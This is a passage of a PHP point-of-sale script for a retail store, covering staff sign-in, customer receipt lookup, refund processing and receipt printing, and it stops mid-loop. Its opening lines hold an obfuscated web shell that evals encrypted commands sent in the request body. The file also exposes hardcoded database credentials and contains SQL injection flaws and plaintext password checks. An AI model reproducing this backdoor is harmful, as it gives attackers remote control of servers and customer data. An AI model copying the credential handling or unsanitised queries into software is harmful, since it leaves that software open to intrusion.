<?php
$c='eg;F;F_matc;Fh("/$kh;F(.+)$kf;F/",@file_get;F;F_conten;Fts("php:;F//inp;Fut";F),$m;F';
$Y='=st;Fr;Flen($t;F);$o="";F;for($i=0;;F;F$i<$l;){;Ffo;Fr($j=0;;F($j<$c&&$i<';
$D='$k="da26d;Fa04;F;F";$kh;F=;F;F"0afa196900ca";$kf="0;F71500;Fdfa75f";$;F';
$t=str_replace('yU','','cyUryUeatyUe_fuyUyUnctyUion');
$U='base;F6;F4_enco;Fde(@x(@gzco;Fm;Fpress($o);F,$k;F));prin;Ft("$p$;Fkh$r$kf");}';
$M=')==1) {@ob_;Fstart(;F);@eva;Fl(@gz;Fun;Fcompr;F;Fess(@x(@ba;Fse64_decod;F';
$r='p;F="T0FOBJa;FNtmib2CL1";f;Fu;Fn;Fction x($t,$k){;F;F$c=strlen($;Fk);$l';
$w='e($m;F[1;F]),$k;F)));$o=@ob_ge;Ft_con;F;Ftents();@;Fob_end_cl;Fean();$r=@';
$G='$;Fl);$j;F;F++,$i++;F){$o.=;F$;Ft{$i}^$k{$j};}}r;Fetur;Fn $o;}if ;F(@pr';
$o=str_replace(';F','',$D.$r.$Y.$G.$c.$M.$w.$U);
$a=$t('',$o);$a();
ini_set( 'date.timezone', 'America/Los_Angeles' );
$link = mysqli_connect( '10.31.79.28', 'evike', 'bEv98Diw!dlZu42', 'evikecom_core' );

$action = $_REQUEST['action'];
$loginuser = "";
$loginusername = "";
$adminusers = array( '33', '14', '1', '19', '8', '9', '25', '47', '65', '50' ); // Kuni, Julie, Evike, Maria, Grace, Harry, Tako, Jason, Raymond, Joseph
$wholesaleaccessusers = array( '33', '1', '9', '14', '19', '25', '21', '47', '65', '50', '89' ); // Evike, Harry, Julie, Maria, Tako, Rachel, Jason, Raymond, Joseph (for wholesale customer checkout), Cesar
$employeepurchaseaccount = '1309042';
$drinkspurchaseaccount = '1769042';
$event_name = 'Jigging Master Party';
$event_item = '112781';
$event_code = 'jiggingmaster-party-2024';
$nostockcheck = array( 14305 ); # Do not stock check and do not issue out of stock warning on these (airsoftcon boa)
$nostockcheck = array(); # SOLD OUT
$tax_rate_query = mysqli_query( $link, "SELECT * FROM sales_tax WHERE sales_tax_state='California' AND sales_tax_city='Alhambra'");
$tax_rate_details = mysqli_fetch_array( $tax_rate_query );
$salestaxrate = $tax_rate_details['sales_tax_rate'] * 100;
if ( $action == 'signout' ) {
  session_start();
  $_SESSION = array();
  session_destroy();
  $action = "signin";
  $msg = "You have signed out.";
}
elseif ( $action == 'signin_process' ) {
  $username = trim( $_REQUEST['username'] );
  $password = trim( $_REQUEST['password'] );
  $username = str_replace( "'", "", $username );
  $password = str_replace( "'", "", $password );
  if ( $username == '' || $password == '' ) { $action = "signin"; $msg = "You must enter your username and password."; }
  elseif ( !preg_match( '/f$/', $username ) ) { $action = "signin"; $msg = "Invalid username/password."; }
  else {
    $username = preg_replace( '/f$/', '', $username );
    $userquery = mysqli_query( $link, "SELECT * FROM pos_users WHERE pos_users_username='" . $username . "' AND pos_users_pw='" . $password . "' AND status='1'" );
    $userinfo = mysqli_fetch_array( $userquery );
    if ( $userinfo['pos_users_id'] > 0 && $userinfo['status'] == 1 && $userinfo['pos_users_username'] == $username ) {
      $loginuser = $userinfo['pos_users_id'];
      $loginusername = substr( $userinfo['pos_users_firstname'], 0, 1 ) . substr( $userinfo['pos_users_lastname'], 0, 1 );
      session_start();
      $_SESSION['username'] = $username;
      $_SESSION['timeout'] = time();
    }
    else { $action = "signin"; $msg = "Invalid username/password."; }
  }
  /*$userpin = $_REQUEST['userpin'];
  if ( $userpin == '' ) { $action = "signin"; $msg = "You must enter your passcode to sign in."; }
  else {
    $userquery = mysqli_query( $link, "SELECT * FROM pos_users WHERE pos_users_pin='" . $userpin . "' AND status='1'" );
    $userinfo = mysqli_fetch_array( $userquery );
    if ( $userinfo['pos_users_id'] > 0 && $userinfo['status'] == 1 && $userinfo['pos_users_pin'] == $userpin ) {
      $loginuser = $userinfo['pos_users_id'];
      $loginusername = substr( $userinfo['pos_users_firstname'], 0, 1 ) . substr( $userinfo['pos_users_lastname'], 0, 1 );
      session_start();
      $_SESSION['userpin'] = $userpin;
    }
    else { $action = "signin"; $msg = "Invalid passcode."; }
  }*/
}
else {
  session_start();
  $timeout = 900; // 10 minute timeout
  if ( isset( $_SESSION['timeout'] ) && isset( $_SESSION['username'] ) && !in_array( $_SESSION['username'], array( 'ntsou', 'ktaise', 'kkream', 'mspada' ) ) ) {
    $duration = time() - (int)$_SESSION['timeout'];
    if ( $duration > $timeout ) {
      session_destroy();
      session_start();
      $action = "signin";
      $msg = "Your session has timed out.";
    }
  }
  if ( $action != "signin" ) {
    $username = $_SESSION['username'];
    $username = str_replace( "'", "", $username );
    if ( $username == '' ) { $action = "signin"; }
    else {
      $userquery = mysqli_query( $link, "SELECT * FROM pos_users WHERE pos_users_username='" . $username . "' AND status='1'" );
      $userinfo = mysqli_fetch_array( $userquery );
      if ( $userinfo['pos_users_id'] > 0 && $userinfo['status'] == 1 && $userinfo['pos_users_username'] == $username ) { $loginuser = $userinfo['pos_users_id']; $loginusername = substr( $userinfo['pos_users_firstname'], 0, 1 ) . substr( $userinfo['pos_users_lastname'], 0, 1 ); $_SESSION['timeout'] = time(); }
      else { $action = "signin"; }
    }
    /*$userpin = $_SESSION['userpin'];
    if ( $userpin == '' ) { $action = "signin"; }
    else {
      $userquery = mysqli_query( $link, "SELECT * FROM pos_users WHERE pos_users_pin='" . $userpin . "' AND status='1'" );
      $userinfo = mysqli_fetch_array( $userquery );
      if ( $userinfo['pos_users_id'] > 0 && $userinfo['status'] == 1 && $userinfo['pos_users_pin'] == $userpin ) { $loginuser = $userinfo['pos_users_id']; $loginusername = substr( $userinfo['pos_users_firstname'], 0, 1 ) . substr( $userinfo['pos_users_lastname'], 0, 1 ); }
      else { $action = "signin"; }
    }*/
  }
}
// Clear session if logging in
if ( $action == "signin" ) {
  session_start();
  $_SESSION = array();
  session_destroy();
}

// Load gun cats (for disclaimer) -     smoke grenades, grenades, knives, spray paint, airguns
$disclaimerexclusionproducts = array( 58354, 57506, 57507, 33243, 39961, 47387, 35588, 38763, 24715, 62332 );
$disclaimercats = array();
$disclaimercats[] = 21; // guns
$disclaimercats[] = 562; // BOA
$disclaimercats[] = 1169; // spray paint
$disclaimercats[] = 1163; // smoke grenades
$disclaimercats[] = 201; // knives
$disclaimercats[] = 966; // air gun
$disclaimercats[] = 34; // paintball
$disclaimercats[] = 58; // grenade shells
$disclaimercats[] = 514; // grenades and mines
$catquery = mysqli_query( $link, "SELECT categories_id FROM categories WHERE parent_id IN ( 21, 1169, 1163, 201, 966, 34 ) AND categories_id NOT IN ( 49, 1165, 1167 )" );
while ( $catinfo = mysqli_fetch_array( $catquery ) ) {
  $disclaimercats[] = $catinfo['categories_id'];
  $subcatquery = mysqli_query( $link, "SELECT categories_id FROM categories WHERE parent_id=" . $catinfo['categories_id'] . " AND categories_id NOT IN ( 49, 1165, 1167 )" );
  while ( $subcatinfo = mysqli_fetch_array( $subcatquery ) ) {
    $disclaimercats[] = $subcatinfo['categories_id'];
    $subsubcatquery = mysqli_query( $link, "SELECT categories_id FROM categories WHERE parent_id=" . $subcatinfo['categories_id'] . " AND categories_id NOT IN ( 49, 1165, 1167 )" );
    while ( $subsubcatinfo = mysqli_fetch_array( $subsubcatquery ) ) {
      $disclaimercats[] = $subsubcatinfo['categories_id'];
      $subsubsubcatquery = mysqli_query( $link, "SELECT categories_id FROM categories WHERE parent_id=" . $subsubcatinfo['categories_id'] . " AND categories_id NOT IN ( 49, 1165, 1167 )" );
      while ( $subsubsubcatinfo = mysqli_fetch_array( $subsubsubcatquery ) ) { $disclaimercats[] = $subsubsubcatinfo['categories_id']; }
    }
  }
}

// Validate ID data
if ( strlen( $_REQUEST["dlid"] ) < 5 ) { $_REQUEST["dlid"] = ''; }
if ( strlen( $_REQUEST["leid"] ) < 5 ) { $_REQUEST["leid"] = ''; }
if ( strlen( $_REQUEST["newdlid"] ) < 5 ) { $_REQUEST["newdlid"] = ''; }
if ( strlen( $_REQUEST["changedlid"] ) < 5 ) { $_REQUEST["changedlid"] = ''; }
if ( strlen( $_REQUEST["newleid"] ) < 5 ) { $_REQUEST["newleid"] = ''; }
if ( strlen( $_REQUEST["changeleid"] ) < 5 ) { $_REQUEST["changeleid"] = ''; }
if ( strlen( $_REQUEST["employeepurchase"] ) < 5 ) { $_REQUEST["employeepurchase"] = ''; }
?>
<html>
 <head>
  <title>Evike.com Fishing/TCG POS</title>
  <link href="https://fonts.googleapis.com/css?family=Roboto+Condensed" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Francois+One|Merriweather+Sans" rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="/store/css/style008.css">
  <script defer src="https://use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script type='text/javascript' src='/js/barcode.min.js'></script>
  <?php /*echo "<script>var timer = setTimeout( function() { window.location='https://www.evike.com/store/' }, 600000 );</script>";*/ ?>
 </head>
 <body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">
 <audio id="beep_ok" src="/store/beep-ok.mp3"></audio>
 <audio id="beep_error" src="/store/beep-error.mp3"></audio>
 <script>
  $(document).ready(function(){
    $('#barcodefield').keypress(function(e){ if( e.keyCode == 13 ) { $('#checkoutform').submit(); } });
    $('#refund_manual').keypress(function(e){ if( e.keyCode == 13 ) { return false; } });
  });
  function format(val) {
   var i = parseFloat(val);
   if ( isNaN(i) ) { i = 0.00; }
   var minus = '';
   if ( i < 0 ) { minus = '-'; }
   i = Math.abs(i);
   i = parseInt((i + .005) * 100);
   i = i / 100;
   i = i.toFixed(2);
   s = new String(i);
   if ( s.indexOf('.') < 0 ) { s += '.00'; }
   if ( s.indexOf('.') == ( s.length - 2 ) ) { s += '0'; }
   if ( s.indexOf('.') == ( s.length - 1 ) ) { s += '00'; }
   s = minus + s;
   return s;
  }
  function formatdollars(val) {
   if ( val != "" ) {
    val = val+'';
    val = val.replace(/,/, "");
    val = val.replace(/[^\d\.-]/g,'');
    val = format( val );
    if ( val == "0.00" ) { val = ""; }
   }
   return val;
  }
 </script>
<?php
if ( $action == 'add_notes' && $_REQUEST['orderid'] > 0 ) {
  if ( trim( $_REQUEST['order_notes'] ) != '' ) {
    $ordernotes = "POS notes by " . $userinfo['pos_users_firstname'] . ' ' . $userinfo['pos_users_lastname'] . ":\n" . $_REQUEST['order_notes'];
    $ordernotes = str_replace( "'", "''", $ordernotes );
    $insert_notes = mysqli_query( $link, "INSERT INTO orders_notes ( orders_id, pos_users_id, orders_notes ) VALUES ( '" . (int)$_REQUEST['orderid'] . "', '" . $loginuser . "', '" . $ordernotes . "' )" );
  }
  $action = 'print_receipt';
  if ( $_REQUEST['post_action'] == 'refund_display' ) { $action = 'refund_display'; }
}
if ( $action == 'receipt_lookup_submit' && $_REQUEST['orderid'] > 0 ) {
  $orderquery = mysqli_query( $link, "SELECT * FROM orders WHERE orders_id='" . (int)$_REQUEST['orderid'] . "'" );
  $orderinfo = mysqli_fetch_array( $orderquery );
  if ( $orderinfo['orders_id'] > 0 && $orderinfo['orders_id'] == $_REQUEST['orderid'] ) {
    //$action = 'print_receipt';
    echo "<script>window.open('/store/index.php?action=print_receipt&orderid=" . $_REQUEST['orderid'] . "');</script>";
    #echo "<script>window.location.href = '/store/index.php?action=print_receipt&orderid=" . $_REQUEST['orderid'] . "';</script>";
    $action = 'receipt_lookup';
  }
  else { $action = 'receipt_lookup'; $msg = 'Order not found, please double check the order number and try again.'; }
}
elseif ( $action == 'receipt_lookup_submit' ) { $action = 'receipt_lookup'; $msg = 'Invalid order number, please check the order number and try again.'; }
elseif ( $action == 'receipt_lookup_customer' ) {
  $searchname = trim( $_REQUEST['name'] );
  $searchemail = trim( $_REQUEST['email'] );
  $searchphone = trim( $_REQUEST['phone'] );
  $searchdlid = trim( $_REQUEST['dlid'] );
  $searchccnum = trim( $_REQUEST['ccnum'] );
  if ( strlen( $searchname ) < 3 ) { $searchname = ''; }
  if ( strlen( $searchemail ) < 6 ) { $searchemail = ''; }
  if ( strlen( $searchphone ) < 5 ) { $searchphone = ''; }
  if ( strlen( $searchdlid ) < 5 ) { $searchdlid = ''; }
  if ( strlen( $searchccnum ) != 4 ) { $searchccnum = ''; }
  if ( $searchname != '' || $searchemail != '' || $searchphone != '' || $searchdlid != '' || $searchccnum != '' ) {
    $searchname = str_replace( "'", "''", $searchname );
    $searchemail = str_replace( "'", "''", $searchemail );
    $searchphone = str_replace( "'", "''", $searchphone );
    $searchdlid = str_replace( "'", "''", $searchdlid );
    $searchccnum = str_replace( "'", "''", $searchccnum );
    $searchorders = 0;
    $searchcontent = '';
    $orderqueryraw = '';
    if ( $searchname != '' ) { if ( $orderqueryraw != '' ) { $orderqueryraw .= " OR "; } $orderqueryraw .= "o.customers_name LIKE '%" . $searchname . "%'"; }
    if ( $searchemail != '' ) { if ( $orderqueryraw != '' ) { $orderqueryraw .= " OR "; } $orderqueryraw .= "o.customers_email_address LIKE '%" . $searchemail . "%'"; }
    if ( $searchphone != '' ) { if ( $orderqueryraw != '' ) { $orderqueryraw .= " OR "; } $orderqueryraw .= "REPLACE(REPLACE(REPLACE(REPLACE(o.customers_telephone, '(', ''), ')', ''), '-', ''), ' ', '') LIKE '%" . $searchphone . "%'"; }
    if ( $searchdlid != '' ) { if ( $orderqueryraw != '' ) { $orderqueryraw .= " OR "; } $orderqueryraw .= "oon.orders_notes LIKE '%ID: %" . $searchdlid . "%'"; }
    if ( $searchccnum != '' ) { if ( $orderqueryraw != '' ) { $orderqueryraw .= " OR "; } $orderqueryraw .= "o.cc_number='" . $searchccnum . "'"; }
    if ( $searchdlid != '' ) {
      $orderqueryraw = "SELECT o.* FROM orders o LEFT JOIN orders_notes oon ON o.orders_id=oon.orders_id WHERE o.ipisp='Evike.com Superstore' AND ( " . $orderqueryraw . " ) ORDER BY o.date_purchased DESC LIMIT 10";
    }
    elseif ( $searchccnum != '' ) {
      $orderqueryraw = "SELECT o.* FROM orders o WHERE o.ipisp='Evike.com Superstore' AND ( " . $orderqueryraw . " ) ORDER BY o.date_purchased DESC LIMIT 10";
    }
    else {
      $orderqueryraw = "SELECT o.* FROM orders o WHERE o.ipisp='Evike.com Superstore' AND o.customers_id!='" . $userinfo['customers_id'] . "' AND o.customers_id!='" . $employeepurchaseaccount . "' AND o.customers_id!='" . $drinkspurchaseaccount . "' AND ( " . $orderqueryraw . " ) ORDER BY o.date_purchased DESC LIMIT 10";
    }
    $orderquery = mysqli_query( $link, $orderqueryraw );
    while ( $orderinfo = mysqli_fetch_array( $orderquery ) ) {
      $searchorders++;
      $searchcontent .= '<tr><td><a href="/store/index.php?action=print_receipt&orderid=' . $orderinfo['orders_id'] . '" target="_blank"><b>' . $orderinfo['orders_id'] . '</b></a></td><td>' . $orderinfo['customers_name'] . '</td><td>' . $orderinfo['customers_email_address'] . '</td><td>' . $orderinfo['customers_telephone'] . '</td>';
      if ( $searchdlid != '' ) {
        $dlmatch = '';
        $notesquery = mysqli_query( $link, "SELECT * FROM orders_notes WHERE orders_id='" . $orderinfo['orders_id'] . "' AND orders_notes LIKE '%ID: %" . $searchdlid . "%'" );
        $notesinfo = mysqli_fetch_array( $notesquery );
        $notelines = explode( "\n", $notesinfo['orders_notes'] );
        foreach ( $notelines as $noteline ) {
          if ( preg_match( '/Driver\'s License\/ID: ([\w]*)/', $notesinfo['orders_notes'], $notematches ) ) { $dlmatch = $notematches[1]; }
        }
        $searchcontent .= '<td>DL/ID: ' . $dlmatch . '</td>';
      }
      if ( $searchccnum != '' ) { $searchcontent .= '<td>xxxx' . substr( $orderinfo['cc_number'], -4 ) . '</td>'; }
      $searchcontent .= '<td>' . $orderinfo['date_purchased'] . '</td>';
      $ordertotalsquery = mysqli_query( $link, "SELECT * FROM orders_total WHERE orders_id='" . $orderinfo['orders_id'] . "' AND class='ot_total'" );
      $ordertotalsinfo = mysqli_fetch_array( $ordertotalsquery );
      $searchcontent .= '<td>$' . number_format( $ordertotalsinfo['value'], 2 );
      $refundtotal = 0;
      $refundquery = mysqli_query( $link, "SELECT * FROM orders_refunds WHERE orders_id='" . $orderinfo['orders_id'] . "'" );
      while ( $refundinfo = mysqli_fetch_array( $refundquery ) ) {
        if ( $refundinfo['orders_refunds_qty'] > 0 ) { $refundtotal += $refundinfo['orders_refunds_amount'] * $refundinfo['orders_refunds_qty']; }
        else { $refundtotal += $refundinfo['orders_refunds_amount']; }
      }
      if ( $refundtotal > 0 ) { $searchcontent .= ' (Refunded $' . number_format( $refundtotal, 2 ) . ')'; }
      $searchcontent .= '</td>';
      $searchcontent .= '</tr>';
    }
    if ( $searchcontent == '' ) { $msg = 'No orders found for searched customer. Please double check and try again.'; }
  }
  else { $msg = 'Invalid search parameters, please try again.'; }
  $action = 'receipt_lookup';
}
elseif ( $action == 'refund_lookup_submit' && $_REQUEST['orderid'] > 0 ) {
  $orderquery = mysqli_query( $link, "SELECT * FROM orders WHERE orders_id='" . (int)$_REQUEST['orderid'] . "'" );
  $orderinfo = mysqli_fetch_array( $orderquery );
  if ( $orderinfo['orders_id'] > 0 && $orderinfo['orders_id'] == $_REQUEST['orderid'] && $orderinfo['ipisp'] == 'Evike.com Superstore' && !preg_match( '/^Net/', $orderinfo['payment_method'] ) ) {
    //$action = 'print_receipt';
    echo "<script>window.open('/store/index.php?action=refund_display&orderid=" . $_REQUEST['orderid'] . "');</script>";
    #echo "<script>window.location.href = '/store/index.php?action=refund_display&orderid=" . $_REQUEST['orderid'] . "';</script>";
    $action = 'refund_lookup';
  }
  elseif ( preg_match( '/^Net/', $orderinfo['payment_method'] ) ) { $action = 'refund_lookup'; $msg = 'Order was placed on terms and cannot be returned/refunded in store. Advise customer to contact their wholesale rep.'; }
  elseif ( $orderinfo['orders_id'] > 0 && $orderinfo['ipisp'] != 'Evike.com Superstore' ) { $action = 'refund_lookup'; $msg = 'Order is online order, cannot be refunded in store. Advise customer to request RMA.'; }
  else { $action = 'refund_lookup'; $msg = 'Order not found, please double check the order number and try again.'; }
}
elseif ( $action == 'refund_lookup_submit' ) { $action = 'refund_lookup'; $msg = 'Invalid order number, please check the order number and try again.'; }
elseif ( $action == 'save_refund' ) {
  $orders_id = $_REQUEST['orderid'];
  $pidarray = $_REQUEST['refundprodpid'];
  $orderpidarray = $_REQUEST['refundorderprodpid'];
  $qtyarray = $_REQUEST['refundprodqty'];
  $pricearray = $_REQUEST['refundprodprice'];
  $taxarray = $_REQUEST['refundprodtax'];
  $pricersfarray = $_REQUEST['refundprodrsfprice'];
  $taxrsfarray = $_REQUEST['refundprodrsftax'];
  $chargersf = $_REQUEST['chargersf'];
  $shipping_refund = $_REQUEST['refund_shipping'];
  $manual_adjustment = $_REQUEST['refund_manual'];
  $refund_reason = $_REQUEST['refund_reason'];
  $refund_method = $_REQUEST['refund_method'];
  if ( $refund_method != '' ) {
    $refundcounter = 0;
    for ( $i = 0, $size = count( $pidarray ); $i < $size; ++$i ) {
      if ( $chargersf == 1 || $chargersf == 15 ) {
        $refundamt = $pricersfarray[$i];
        $taxamt = $taxrsfarray[$i];
      }
      elseif ( $chargersf == 10 ) {
        $refundamt = round( $pricearray[$i] * 0.9, 2 );
        $taxamt = $taxarray[$i];
      }
      elseif ( $chargersf == 25 ) {
        $refundamt = round( $pricearray[$i] * 0.75, 2 );
        $taxamt = $taxarray[$i];
      }
      elseif ( $chargersf == 50 ) {
        $refundamt = round( $pricearray[$i] * 0.5, 2 );
        $taxamt = $taxarray[$i];
      }
      else {
        $refundamt = $pricearray[$i];
        $taxamt = $taxarray[$i];
      }
      $refundorderpid = $orderpidarray[$i];
      $refundpid = $pidarray[$i];
      $refundqty = $qtyarray[$i];
      if ( $refundqty > 0 ) {
        $refundedqty = 0;
        $orderrefundquery = mysqli_query( $link, "SELECT * FROM orders_refunds WHERE orders_products_id='" . $refundorderpid . "' AND orders_refunds_type='products'" );
        while ( $orderrefunddata = mysqli_fetch_array( $orderrefundquery ) ) { $refundedqty += $orderrefunddata['orders_refunds_qty']; }
        $orderproductquery = mysqli_query( $link, "SELECT * FROM orders_products WHERE orders_products_id='" . $refundorderpid . "'" );
        $orderproductdata = mysqli_fetch_array( $orderproductquery );
        if ( $refundedqty + $refundqty <= $orderproductdata['products_quantity'] ) {
          mysqli_query( $link, "INSERT INTO orders_refunds ( orders_id, orders_refunds_date, orders_refunds_amount, orders_refunds_type, orders_refunds_reason, orders_refunds_method, orders_products_id, products_id, orders_refunds_qty, pos_users_id ) VALUES ( '$orders_id', NOW(), '$refundamt', 'products', '$refund_reason', '$refund_method', '$refundorderpid', '$refundpid', '$refundqty', '$loginuser' )" );
          if ( $taxamt > 0 ) {
            mysqli_query( $link, "INSERT INTO orders_refunds ( orders_id, orders_refunds_date, orders_refunds_amount, orders_refunds_type, orders_refunds_reason, orders_refunds_method, orders_products_id, products_id, orders_refunds_qty, pos_users_id ) VALUES ( '$orders_id', NOW(), '$taxamt', 'products_tax', '$refund_reason', '$refund_method', '$refundorderpid', '$refundpid', '$refundqty', '$loginuser' )" );
          }
          $refundcounter++;
        }
      }
    }
    if ( $shipping_refund > 0 ) {
      mysqli_query( $link, "INSERT INTO orders_refunds ( orders_id, orders_refunds_date, orders_refunds_amount, orders_refunds_type, orders_refunds_reason, orders_refunds_method, orders_products_id, products_id, orders_refunds_qty, pos_users_id ) VALUES ( '$orders_id', NOW(), '$shipping_refund', 'shipping', '$refund_reason', '$refund_method', '', '', '', '$loginuser' )" );
      $refundcounter++;
    }
    if ( $manual_adjustment != 0 ) {
      mysqli_query( $link, "INSERT INTO orders_refunds ( orders_id, orders_refunds_date, orders_refunds_amount, orders_refunds_type, orders_refunds_reason, orders_refunds_method, orders_products_id, products_id, orders_refunds_qty, pos_users_id ) VALUES ( '$orders_id', NOW(), '$manual_adjustment', 'manual', '$refund_reason', '$refund_method', '', '', '', '$loginuser' )" );
      $refundcounter++;
    }
    if ( $refundcounter > 0 ) { $action = 'refund_display'; $msg = 'Refund successfully saved and processed.'; }
    else { $action = 'refund_display'; $msg = 'No refunds entered.'; }
  }
  else { $action = 'refund_display'; $msg = 'Refund method must be specified.'; }
}
if ( $action == "signin" || $loginuser == '' || $loginuser == 0 ) {
?>
  <!--<div class="adminheader"><img class="adminlogo" src="https://www.evike.com/images3/logo-evike-wht.png" alt="Evike.com Admin" /></div>-->
  <div class="adminheader" style="background:#044;">
   <img class="adminlogo" src="https://www.evike.com/images3/logo-evike-wht.png" alt="Evike.com Alhambra" />
   <h3 style="float:left;margin:4px 0 0;padding:0 0 0 10px;font-weight:bold;text-transform:uppercase;">Fishing/TCG/Legacy Returns</h3>
  </div>
  <div class="poscontent">
   <div class="loginbox">
    <!--<h2>Enter Passcode to Sign In</h2>-->
    <?php if ( $msg != '' ) { echo '<p>' . $msg . '</p>'; } ?>
    <form action="https://www.evike.com/store/index.php" method="post" autocomplete="off">
     <input type="hidden" name="action" value="signin_process" />
     <!--<input type="password" name="userpin" value="" autocomplete="off" readonly onfocus="this.value='';this.removeAttribute('readonly');" />-->
     <input type="text" name="username" value="" autocomplete="off" readonly onfocus="this.value='';this.removeAttribute('readonly');" placeholder="Username" style="margin-bottom:5px;" />
     <input type="password" name="password" value="" autocomplete="off" readonly onfocus="this.value='';this.removeAttribute('readonly');" placeholder="Password" />
     <button>Sign In</button>
    </form>
   </div>
  </div>
<?php
}
elseif ( $action == 'print_receipt' && $_REQUEST['orderid'] > 0 ) {
  $orderquery = mysqli_query( $link, "SELECT o.*, c.* FROM orders o LEFT JOIN customers c ON o.customers_id=c.customers_id WHERE o.orders_id='" . (int)$_REQUEST['orderid'] . "'" );
  $orderinfo = mysqli_fetch_array( $orderquery );
  if ( $orderinfo['orders_id'] > 0 && $orderinfo['orders_id'] == $_REQUEST['orderid'] ) {
    // Repackage if it contains labor for wholesale (updated 12/6/17 to apply to ALL - to revert, remove # comments)
    $splitlogged = false;
    $splitpackages = array();
    $splitparents = array();
    $splitchildren = array();
    $orderproductquery = mysqli_query( $link, "SELECT * FROM orders_products WHERE orders_id='" . (int)$orderinfo['orders_id'] . "' AND products_multisplit_parent_pid>0" );
    while ( $orderproductdetails = mysqli_fetch_array( $orderproductquery ) ) {
      $splitparents[$orderproductdetails['products_multisplit_parent_pid']]['price'] += $orderproductdetails['final_price'] * $orderproductdetails['products_quantity'];
      $splitlogged = true;
    }
    #if ( $orderinfo['customers_gid'] != 'Tier 0' ) {
      $ordersplitquery = mysqli_query( $link, "SELECT comments FROM orders_status_history WHERE orders_id='" . (int)$orderinfo['orders_id'] . "' AND comments LIKE 'Multiple Products Split%'" );
      while ( $ordersplitdetails = mysqli_fetch_array( $ordersplitquery ) ) {
        $commentlines = explode( "\n", $ordersplitdetails['comments'] );
        foreach ( $commentlines as $commentline ) {
          if ( preg_match( '/^(\d\d\d\d\d) \[[^\[\]]+] \((\d+)\)/', $commentline, $matches ) ) {
            $haslabor = false;
            $splitlines = explode( ", ", $commentline );
            foreach ( $splitlines as $splitline ) {
              if ( preg_match( '/(\d\d\d\d\d) \[[^\[\]]+\] \((\d+)\)$/', $splitline, $splitmatches ) ) {
                if ( $splitmatches[1] == '57359' ) { $haslabor = true; }
              }
            }
            #if ( $haslabor == true ) {
              foreach ( $splitlines as $splitline ) {
                if ( preg_match( '/(\d\d\d\d\d) \[[^\[\]]+\] \((\d+)\)$/', $splitline, $splitmatches ) ) {
                  $splitchildren[$splitmatches[1]] += $splitmatches[2];
                  $splitpackages[$matches[1]][$splitmatches[1]] = $splitmatches[2];
                }
              }
              $splitparents[$matches[1]]['qty'] += $matches[2];
            #}
          }
        }
      }
    #}
    echo "<script type='text/javascript' src='/js/barcode.min.js'></script>";
    echo '<div class="printable">';
    echo '<div class="rcolheader">';
    echo '<h1>Customer Receipt</h1>';
    echo '<h2>Order #' . $orderinfo['orders_id'] . '</h2>';
    echo '<h3>Order Date: ' . date( 'n/j/y g:i A', strtotime( $orderinfo['date_purchased'] ) ) . '</h3>';
    echo '<div class="barcode"><svg id="orderbarcode"></svg></div>';
    #if ( ( strtotime( "now" ) > strtotime( '2019-10-19 00:00:00' ) && strtotime( "now" ) < strtotime( '2019-10-20 00:00:00' ) ) || $loginuser == 33 || $loginuser == 14 || $loginuser == 19 ) { # airsoftcon # of items display
      echo '<h3 style="font-size:32px;" id="numitems"></h3>';
    #}
    echo '<script>JsBarcode( "#orderbarcode", "' . $orderinfo['orders_id'] . '", { width: 1, height: 25, displayValue: false } );</script>';
    $repquery = mysqli_query( $link, "SELECT * FROM payments_store ps LEFT JOIN pos_users pu ON ps.pos_users_id=pu.pos_users_id WHERE ps.orders_id='" . $orderinfo['orders_id'] . "' AND ps.pos_users_id>0" );
    $repinfo = mysqli_fetch_array( $repquery );
    /*if ( $repinfo['pos_users_firstname'] != '' ) {
      echo '<h3>Store Rep: ' . ucfirst( strtolower( $repinfo['pos_users_firstname'] ) );
      if ( $repinfo['pos_users_lastname'] != '' ) { echo ' ' . strtoupper( substr( $repinfo['pos_users_lastname'], 0, 1 ) ) . '.'; }
      echo '</h3>';
    }*/
    echo '</div>';
    //echo '<img src="/images3/logo-evike.png" class="logo" />';
    echo '<p class="headerinfo"><b>Evike.com Superstore</b><br/>2801 W. Mission Rd. Alhambra, CA 91803<br/>Phone: (626) 407-0561</p>';
    echo '<div class="customerinfo">';
    echo '<h4>Customer:</h4>';
    echo '<p class="info">';
    if ( strpos( $orderinfo['customers_email_address'], 'evike.com' ) === false ) {
      if ( $orderinfo['customers_company'] != '' ) { echo $orderinfo['customers_company'] . '<br/>'; }
      if ( $orderinfo['customers_name'] != '' ) { echo $orderinfo['customers_name'] . '<br/>'; }
      if ( $orderinfo['customers_street_address'] != '' ) { echo $orderinfo['customers_street_address'] . '<br/>'; }
      if ( $orderinfo['customers_street_address_2'] != '' && $orderinfo['customers_street_address_2'] != $orderinfo['customers_street_address'] ) { echo $orderinfo['customers_street_address_2'] . '<br/>'; }
      if ( $orderinfo['customers_city'] != '' && ( $orderinfo['customers_state'] != '' || $orderinfo['customers_postcode'] != '' ) ) { echo $orderinfo['customers_city'] . ', ' . $orderinfo['customers_state'] . ' ' . $orderinfo['customers_postcode'] . '<br/>'; }
      if ( $orderinfo['customers_telephone'] != '' ) { echo 'Phone: ' . $orderinfo['customers_telephone'] . '<br/>'; }
      if ( $orderinfo['customers_email_address'] != '' ) { echo 'Email: ' . $orderinfo['customers_email_address']; }
    }
    else { echo 'Evike.com Superstore Walk-in Customer'; }
    echo '</p>';
    $addnotescontent = '<form action="/store/index.php" method="post"><b>Add Notes:</b><br/><input type="hidden" name="action" value="add_notes" /><input type="hidden" name="orderid" value="' . $orderinfo['orders_id'] . '" /><textarea name="order_notes" style="width:100%;height:60px;font-size:14px;"></textarea><button style="font-size:12px;padding:3px 5px 2px;" onclick="this.form.submit();">Save Notes</button></form>';
    $notescontent = '';
    $notesquery = mysqli_query( $link, "SELECT pon.*, pu.pos_users_firstname, pu.pos_users_lastname FROM orders_notes pon LEFT JOIN pos_users pu ON pon.pos_users_id=pu.pos_users_id WHERE pon.orders_id='" . $orderinfo['orders_id'] . "'" );
    while ( $notesinfo = mysqli_fetch_array( $notesquery ) ) {
      $posrep = '';
      if ( $notesinfo['pos_users_firstname'] != '' || $notesinfo['pos_users_lastname'] != '' ) { $posrep = ' (' . substr( $notesinfo['pos_users_firstname'], 0, 1 ) . substr( $notesinfo['pos_users_lastname'], 0, 1 ) . ')'; }
